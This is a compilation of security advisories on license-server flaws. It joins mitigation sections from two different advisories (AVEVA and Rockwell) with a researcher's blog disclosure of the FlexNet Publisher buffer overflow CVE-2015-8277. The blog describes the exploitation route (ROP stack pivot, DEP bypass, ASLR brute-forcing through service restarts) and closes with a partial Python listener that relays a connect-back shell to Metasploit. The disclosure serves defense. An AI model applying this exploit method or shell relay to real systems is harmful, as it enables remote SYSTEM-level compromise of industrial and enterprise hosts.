### 3.4 RESEARCHER

An anonymous researcher reported this vulnerability to AVEVA, who then reported it to NCCIC.

## 4. MITIGATIONS

AVEVA recommends affected users install update “Hotfix Wonderware License Server VU-485744” or later, which can be downloaded from:

<https://softwaresupportsp.schneider-electric.com/#/producthub/details?id=5076> (login required)

AVEVA has published Security Bulletin LFSEC00000129. It can be found at the following location:

<https://sw.aveva.com/hubfs/assets-2018/pdf/security-bulletin/SecurityBulletin_LFSec129.pdf>

NCCIC recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](/ics/alerts/ICS-ALERT-10-301-01).
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

NCCIC reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

NCCIC also provides a section for [control systems security recommended practices](/ics/content/recommended-practices) on the ICS-CERT web page. Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies](/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf).

Additional mitigation guidance and recommended practices are publicly available on the [ICS-CERT website](/ics/) in the Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](/ics/tips/ICS-TIP-12-146-01B).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to NCCIC for tracking and correlation against other incidents.

No known public exploits specifically target this vulnerability.

## 5. MITIGATIONS

Rockwell Automation recommends users with affected versions of CodeMeter and/or FlexNet Publisher that were installed with FactoryTalk Activation Manager to update Factory Talk Activation Manager to v4.02. If unable to update FactoryTalk Activation Manager to v4.02, update CodeMeter to a compatible version of CodeMeter that is compatible with FactoryTalk Activation Manager.

Rockwell Automation also encourages users to combine the updates above with these general security guidelines to employ multiple strategies simultaneously.

* Block all traffic to EtherNet/IP or other CIP protocol-based devices from outside the Manufacturing Zone by blocking or restricting access to Port 2222/TCP and UDP and Port 44818/TCP and UDP, using proper network infrastructure controls, such as firewalls, UTM devices, or other security appliances. For more information on TCP/UDP ports used by Rockwell Automation Products, see Knowledgebase Article ID 898270 available at: https://rockwellautomation.custhelp.com/app/answers/detail/a\_id/898270/page/1 (Login required).
* Minimize network exposure for all control system devices and/or systems, and ensure they are not accessible from the Internet.
* Locate control system networks and devices behind firewalls and isolate them from the business network.
* When remote access is required, use secure methods such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. VPN is only as secure as the connected devices.

CVE-2015-8277[b0yd](https://www.securifera.com/blog/author/b0yd/ "Posts by b0yd")2022-08-12T20:52:23+00:00
## SUMMARY

### The following vulnerability was found in [Flexera’s FlexNet Publisher](http://www.flexerasoftware.com/producer/products/software-monetization/flexnet-licensing/) (License Manager) :

## CVE-2015-8277

### Certain remote message parsing functions inside the FlexNet Publisher daemon use a custom string copy function that does not provide proper bounds checking on incoming data. This allows for specially crafted messages to cause a stack buffer overflow. It was also found that the same vulnerable code is packaged into all customer binaries produced by the FlexNet Publisher.

### ***Since this disclosure is being released more than 90 days after the release of the patch, it will be accompanied with full details of the vulnerability and a proof of concept.***

## IMPACT

**Access Vector:**Network Exploitable

**Access Complexity:**Low

**Authentication:**Not required to exploit

**Impact Type:**Allows remote code execution, Allows disruption of service

**Privilege Level:**SYSTEM

## DETAILS

### A few months ago, I assisted some colleagues ( @RGKelley5 & @ruddawg26 ) with root cause analysis on a particular set of crashes being triggered in a vendor binary produced by FlexNet Publisher. The article describing how the vulnerability was discovered and triggered can be found [here](http://securitymumblings.blogspot.com/2016/02/cve-2015-8277.html). My goal was to locate the vulnerability and determine whether it was exploitable.

### The vulnerability found in lmgrd.exe (and any vendor binary created by FlexNet Publisher), can be attributed to a custom strncpy. Similar to a traditional strncpy function, this custom string copy function takes a source buffer, a destination buffer, and a length as parameters. However, the flaw in this function is that it ignores the length parameter. Since the length parameter is ignored, this effectively transforms the function into strcpy, with the constraints that come along with it. Tracing the usage of this function shows it is used extensively in both lmgrd and vendor binaries produced by FlexNet Publisher. What makes this function so dangerous is the assumption by developers that the max length is being respected, when unfortunately it is not. Pseudo-code for the vulnerable strncpy can be seen below.

![](https://www.securifera.com/wp-content/uploads/2016/01/pseudo_flex.jpg "pseudo_flex")
### Upon further analysis, we found that this particular custom strncpy function was used in nearly 100 different places. Most of the usages originated in message parsing functions for user supplied data. One of the first steps I typically take to determine the exploitable of a vulnerability is to identify what memory protections where compiled into an application. Some quick visual analysis revealed the use of stack cookies and running Corelan’s mona script, we can see that the lmgrd binary has been compiled with ASLR, DEP, and SafeSEH.

![](https://www.securifera.com/wp-content/uploads/2016/02/lmgrd.png "lmgrd")
### We’ve learned that one cannot discount a vulnerability just because the application has been compiled with memory protections; there are always exceptional cases. The next, and rather tedious step, was to rank each usage of the vulnerable strncpy by how difficult it would be to exploit. This meant taking into account whether the destination buffer was on the stack or the heap, whether stack cookies were employed in the current stack frame, etc. After some searching, we located the function for parsing messages of type 0x107. This particular function was special because unlike most of the other vulnerable strncpy usages, it did not have a stack cookie compiled into its stack frame. It was assumed this was because the destination buffer for the vulnerable strncpy was only 4 bytes and so maybe the compiler just thought it was an address.

![](https://www.securifera.com/wp-content/uploads/2016/02/vuln_107.png "vuln_107")
### Exercising this message parsing function with a specially crafted packet did indeed cause a stack buffer overflow. One additional requirement however, was that the overflow could not overflow into the function parameters or the subsequent memcpy would throw an exception and we would not gain control of execution. Fortunately, we can simply overwrite the return pointer with a ROP gadget that will pivot our stack to our input buffer on the stack and continue ROP-ing from there. The following figure illustrates what the stack will look like before and after the buffer overflow.

![](https://www.securifera.com/wp-content/uploads/2016/02/stack_overflow.png "stack_overflow")
### At this point there are still two memory protections we need to overcome, DEP and ASLR. Bypassing DEP is rather trivial as we can use ROP gadgets from the current binary to re-enable an executable stack. ASLR, however, will be more difficult to defeat as we will typically need to leak an address to either the binary or a loaded library. With this in mind, we began looking for any additional bugs that could be leveraged to disclose memory addresses we could use.

### Unfortunately for us, we were unable to figure out how to get the application to leak back addresses for the binary or loaded libraries. However, during our research we got a better understanding of how the application worked. There are actually two binaries that run as a service in a typical Flexera Publisher vendor installation. One binary is named lmgrd.exe and the second is typically the name of the vendor application, i.e. vendor.exe. We found that the lmgrd binary acted as a manager for the vendor binary and could be used to restart the vendor binary if it crashed.

### With this discovery, we thought we might be able to take the naive approach and attempt to brute force the base address of the loaded library we planned on using for our ROP chain. We would then send a message to the lmgrd service to restart the application service until we successfully guessed the base address. This was possible because we noticed that the base address for the loaded library only varied by 12 bits, meaning there were only 4096 possible base addresses. Since each selection of a new base address is presumed to be random, our brute forcer is more of a brute guesser hoping for a collision.

### For our proof of concept, we combined all of these elements into one python script. In order to verify when the exploit was successful, we decided to use shellcode for a connect back shell and setup a separate thread to notify the main thread when a connection was made. This way we would know precisely when to stop the brute forcer. We used the [pwntools](http://pwntools.com/) library to simplify the proxying of our connect back shell on to a Metasploit server as can be seen below.

[sourcecode language=”python”]#######################################################################

#

# This function listens for the incoming stage and acts like a proxy

# to metasploit. The reason for this is so we can check when the exploit

# landed and stop brute forcing

#

def recv\_conn():

global sock

global sock2

proxy\_port = 4444

msf\_port = 4445

local\_host = ‘192.168.229.133’

#Listening for incoming connection on port 4444

sock = listen( proxy\_port )

sock.wait\_for\_connection()

#Connet to msf

sock2 = remote(local\_host,msf\_port)

#Connect the pipes

if sock:

sock.connect\_output(sock2)

if sock2:

sock2.connect\_output(sock)[/sourcecode]
